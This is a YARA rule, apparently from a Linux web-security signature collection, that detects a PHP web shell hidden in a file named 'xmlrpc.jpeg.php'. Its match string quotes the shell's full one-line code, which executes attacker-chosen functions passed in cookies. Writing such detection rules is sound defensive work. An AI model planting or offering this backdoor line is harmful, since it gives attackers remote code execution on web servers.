rule infected_09_06_18_xmlrpc_jpeg {
  meta:
    description = "shells - file xmlrpc.jpeg.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2018-09-06"
    hash1       = "fe4464eb64bc15f0d299ce4a909b2ebe2d406accf91bb7c4126a639a69256548"

  strings:
    $s1 = "<?php if(isset($_COOKIE[\"hf\"])){$_COOKIE[\"Gao\"]($_COOKIE[\"hf\"]);exit;}" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 1KB and
      (all of them)
    ) or (all of them)
}